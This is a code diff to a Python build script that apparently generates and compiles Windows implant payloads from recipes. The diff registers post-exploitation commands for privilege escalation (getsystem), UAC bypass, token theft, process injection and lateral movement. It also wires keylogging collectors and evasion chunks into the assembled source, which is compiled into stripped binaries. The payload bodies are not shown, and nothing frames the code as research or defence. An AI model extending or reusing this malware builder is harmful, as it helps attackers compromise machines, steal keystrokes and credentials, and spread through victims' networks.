@@ -1004,6 +1004,12 @@ CMD_ID_MAP = {
     "commands/cmd_netinfo_lolbin": 0x09,
     "commands/cmd_exec": 0x0A,
     "commands/cmd_exec_powershell": 0x0B,
+    # Post-exploitation commands
+    "commands/cmd_getsystem": 0x20,
+    "commands/cmd_uac_bypass": 0x21,
+    "commands/cmd_token": 0x22,
+    "commands/cmd_inject": 0x23,
+    "commands/cmd_lateral": 0x24,
 }
 
 
@@ -1195,13 +1201,16 @@ def assemble(recipe_path: str, extra_vars: dict | None = None,
 
     source = "\n".join(output_parts) + "\n" + "".join(bodies)
 
+    # Filter collectors to only include those that were actually resolved (not skipped as disabled)
     collectors = recipe.get("collectors", [])
-    source = source.replace("{{COLLECTOR_CALLS}}", build_collector_calls(collectors))
-    source = source.replace("{{STAGED_COLLECTOR_CALLS}}", build_staged_calls(collectors))
-    source = source.replace("{{COLLECTOR_FN_LIST}}", build_fn_list(collectors))
-    source = source.replace("{{KEYLOG_COLLECTOR_CALLS}}", build_paced_calls(collectors))
+    resolved_collectors = [c for c in collectors if c in resolved_set or substitutions.get(c, c) in resolved_set]
+    source = source.replace("{{COLLECTOR_CALLS}}", build_collector_calls(resolved_collectors))
+    source = source.replace("{{STAGED_COLLECTOR_CALLS}}", build_staged_calls(resolved_collectors))
+    source = source.replace("{{COLLECTOR_FN_LIST}}", build_fn_list(resolved_collectors))
+    source = source.replace("{{KEYLOG_COLLECTOR_CALLS}}", build_paced_calls(resolved_collectors))
 
-    resolved_commands = [substitutions.get(c, c) for c in commands]
+    # Filter commands to only include those that were actually resolved (not skipped as disabled)
+    resolved_commands = [substitutions.get(c, c) for c in commands if c in resolved_set or substitutions.get(c, c) in resolved_set]
     source = source.replace("{{COMMAND_DISPATCH}}", build_command_dispatch(resolved_commands))
 
     evasion_chunks = recipe.get("evasion", [])
@@ -1459,9 +1468,9 @@ def compile_zig(source_path: str, output_path: str, dll_def: str | None = None,
     if is_dll and dll_def:
         cmd.append(dll_def)
     cmd.extend([
-        "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
+        "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-loleaut32", "-lshell32", "-lgdi32",
         "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
-        "-lwldap32", "-lnetapi32", "-lmpr",
+        "-lwldap32", "-lnetapi32", "-lmpr", "-lwbemuuid",
         "-s",
     ])
     if is_dll:
@@ -1503,9 +1512,9 @@ def compile_mingw(source_path: str, output_path: str, dll_def: str | None = None
     if is_dll and dll_def:
         cmd.append(dll_def)
     cmd.extend([
-        "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
+        "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-loleaut32", "-lshell32", "-lgdi32",
         "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
-        "-lwldap32", "-lnetapi32", "-lmpr",
+        "-lwldap32", "-lnetapi32", "-lmpr", "-lwbemuuid",
         "-static", "-s", "-Wl,--strip-all",
     ])
     if is_dll:
